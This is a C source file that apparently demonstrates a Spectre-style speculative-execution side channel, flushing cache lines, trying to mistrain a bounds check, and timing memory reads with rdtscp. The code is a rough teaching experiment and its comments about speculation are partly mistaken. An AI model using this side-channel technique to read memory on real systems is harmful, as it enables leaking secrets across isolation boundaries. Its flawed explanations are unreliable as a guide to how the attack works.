#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <x86intrin.h>


/***
* Victim Code
***/

// int *memory_chunk_one;
// memory_chunk_one = (int *) malloc(10 * sizeof(int));
// int *memory_chunk_two;
// memory_chunk_two = (int *) malloc(10 * sizeof(int));

/// sizeof(int) is 4 bytes
/// 40 bytes = 320 bits

int array_size = 10;
uint8_t array1[10] = {0,1,2,3,4,5,6,7,8,9};
uint8_t array2[256*512] = {11,22,33,44,55,66,77,88,99,110};
uint8_t array3[256*512] = {99,11,23,15,16}; //placebo


/// check whether an index is in the boundary of array1
/// intended to make this function run longer in order to win the time for speculative execution
/// return 1 means true, 0 means false
int is_in_boundary (int index){
    sleep(1);
    if (index < 0){
        return 0;
    }
    if (index >= array_size){
        return 0;
    }
    return 1;
}


int main (int argc, char *argv[]){
    /*** 
     * test if we can use out of boundary vulnerbility to access extra memory location in C language.
     * 
     * By using this vulnerbility, we simulate the situation that processor resolves out-of-boundary error 
     * without reporting exceptions.
     * 
     * in real world, processors are likely to resolve such error by replacing out-of-boundary 
     * index by (address of a secret byte to read) - (base address of current array/object).
     * that's being said, this case is theoretically same as real world examples, but implementally easier.
     ***/
    uint8_t *ptr_1 = &array1[24];
    uint8_t *ptr_2 = &array2[0];
    printf("Test whether we can use out-of-boundary vulnerbility: %s\n", (ptr_1 == ptr_2) ? "true" : "false");
    

    volatile uint8_t *addr;
    int junk = 0;

    // clear cache
    _mm_clflush(array1);
    _mm_clflush(array2);
    _mm_clflush(array3);
    


    // mistrain execution predictor 4 times 
    for (int x = 1; x <= 16; x+=x){    /// when x == 16, it is already out of boundary of array1 and goes into array2
        if ((is_in_boundary(x)) == 1){ /// Spectre Attak
            printf("Value at array1[%d] is %d\n",x, array1[x]);
        }
    }


    // Check whether target data is in cache
    register uint64_t time1, time2; // put them in register for faster (thus accurate) execution
    time1 = __rdtscp(&junk);
    addr = &array1[1];
    junk = *addr;
    time2 = __rdtscp(&junk);
    printf("It takes CPU %ld cycles to find value of array1[1] which should be in cache.\n", (long) time2-time1);
    time1 = __rdtscp(&junk);
    addr = &array2[0];
    junk = *addr;
    time2 = __rdtscp(&junk);
    printf("It takes CPU %ld cycles to find value of array2[0] which should be in cache (spectre attacked).\n", (long) time2-time1);
    
    time1 = __rdtscp(&junk);
    addr = &array3[1];
    junk = *addr;
    time2 = __rdtscp(&junk);
    printf("It takes CPU %ld cycles to find value of array3[1] which should be NOT in cache (placebo).\n", (long) time2-time1);
}